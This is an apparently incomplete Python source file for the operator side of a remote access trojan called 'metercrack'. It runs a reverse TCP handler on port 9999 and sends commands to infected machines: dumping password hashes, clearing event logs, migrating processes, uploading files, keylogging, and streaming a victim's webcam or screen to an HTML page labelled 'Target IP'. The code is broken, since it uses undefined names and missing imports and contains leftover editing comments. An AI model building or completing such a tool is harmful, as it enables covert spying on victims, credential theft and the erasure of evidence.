import socket
import threading
import time
import cv2
import numpy as np
import keyboard  # Import the keyboard library
from datetime import datetime
from os import path

streaming = False
keylogger_data = []  # List to store keylogger data
keylogger_running = False  # Flag to check if keylogger is running

html_template = """
<!doctype html>
<html lang="en">
  <head>
    <title>Video Streaming</title>
  </head>
  <body>
    <h1>Video Streaming</h1>
    
    <!-- Description Section -->
    <div>
      <p><strong>Target IP :</strong> {{ target_ip }}</p>
      <p><strong>Start Time :</strong> {{ start_time }}</p>
    </div>
    
    <!-- Video Stream Section -->
    <div>
      <img src="{{ stream_source }}" width="640" height="480">
    </div>
  </body>
</html>
"""

def start_streaming(client_socket, mode, client_id):
    global streaming
    streaming = True
    target_ip = client_id.split(":")[0]
    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Get the current date and time 

    print(Fore.BLUE + "[ * ] Starting streaming session...")
    time.sleep(1)
    print(Fore.BLUE + "[ * ] Preparing player...")
    time.sleep(1)

    # Generate the HTML content dynamically
    html_content = html_template.replace("{{ target_ip }}", target_ip).replace("{{ start_time }}", start_time)

    # Create a folder to store the generated HTML (if not already present)
    output_folder = "web_interface"
    if not path.exists(output_folder):
        os.makedirs(output_folder)
    
    # Define the path for the HTML file
    html_path = path.join(output_folder, f"stream_{client_id}.html")

    # Save the HTML content to a file
    with open(html_path, 'w') as f:
        f.write(html_content)
    
    print(Fore.BLUE + f"[ * ] Player generated at: {html_path}")

    # Start streaming video
    print(Fore.BLUE + "[ * ] Streaming...")

    # Generate video frames for streaming
    threading.Thread(target=lambda: generate_frames(client_socket, client_id)).start()

def generate_frames(client_socket, client_id):
    global streaming
    while streaming:
        data = client_socket.recv(921600)
        if not data:
            break
        frame = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
        ret, buffer = cv2.imencode('.jpg', frame)
        frame = buffer.tobytes()
        
        # Write the frame to a file (this file will be used in the generated HTML)
        frame_path = path.join("web_interface", f"frame_{client_id}.jpg")
        with open(frame_path, 'wb') as f:
            f.write(frame)

        # Update the video stream source in the HTML file
        update_html_frame_source(client_id, frame_path)
        time.sleep(0.05)  # Adjust frame rate if needed

def update_html_frame_source(client_id, frame_path):
    # Update the HTML file to point to the new frame (for continuous streaming)
    html_path = path.join("web_interface", f"stream_{client_id}.html")
    with open(html_path, 'r') as f:
        html_content = f.read()

    # Replace the image source with the new frame
    new_html_content = html_content.replace("{{ stream_source }}", frame_path)

    # Write the updated HTML back to the file
    with open(html_path, 'w') as f:
        f.write(new_html_content)

# Keep your existing functions below, such as `keylogger_callback`, `start_keylogger`, etc.

def handle_client(client_socket, addr):
    target_ip, target_port = addr
    client_id = f"{target_ip}:{target_port}"
    print(Fore.GREEN + f"[ * ] Session started for {client_id}")

    while True:
        try:
            command = input(Fore.MAGENTA + f"metercrack ({client_id}) > ")
        except EOFError:
            break

        print(Fore.YELLOW + f"[ * ] Command '{command}' sent to client.")
        client_socket.send(command.encode('utf-8'))

        # Handle commands
        if command == "hashdump":
            print(Fore.YELLOW + "[ * ] Starting...")
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(Fore.WHITE + response)

        elif command == "migrate":
            print(Fore.YELLOW + "[ * ] Starting...")
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(Fore.WHITE + response)

        elif command == "clearev":
            print(Fore.YELLOW + "[ * ]  Starting......")
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(Fore.WHITE + response)

        elif command.startswith("upload"):
            # Parse the upload command to extract file path and destination
            try:
                parts = command.split(' ')
                if len(parts) < 3:
                    print(Fore.RED + "[ * ] Usage: upload <file_to_upload> -d <destination_path>")
                    continue

                file_to_upload = parts[1]
                destination_path = parts[3] if '-d' in parts else None

                if not destination_path:
                    print(Fore.RED + "[ * ] Destination path not provided.")
                    continue

                client_socket.send(command.encode('utf-8'))  # Send upload command to client
                response = client_socket.recv(4096).decode('utf-8', errors='ignore')
                print(Fore.WHITE + response)

            except Exception as e:
                print(Fore.RED + f"[ * ] Error: {e}")


        elif command == "keyscan_start":
            start_keylogger()
            continue

        elif command == "keyscan_stop":
            stop_keylogger()
            continue

        elif command == "keyscan_dump":
            print(Fore.WHITE + dump_keylogger_data())
            continue

        elif command.startswith("webcam_stream") or command.startswith("screenshare"):
            mode = "webcam" if "webcam" in command else "screenshare"
            start_streaming(client_socket, mode, client_id)
            continue

        elif command.startswith("webcam_list"):
            print(Fore.YELLOW + "[ * ] Requesting webcam list from client...")
            client_socket.send(command.encode('utf-8'))
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(Fore.WHITE + "[ * ] Available Webcams:\n" + response)

# Keep your existing `main` function and other logic below

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9999))
    server_socket.listen(5)
    print(Fore.GREEN + "[ * ] Started reverse TCP handler on 0.0.0.0:9999")
    print(Fore.GREEN + "[ * ] Listening for incoming connections...")

    while True:
        client_socket, addr = server_socket.accept()
        print(Fore.GREEN + f"[ * ] Connection established from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

if __name__ == "__main__":
    main()
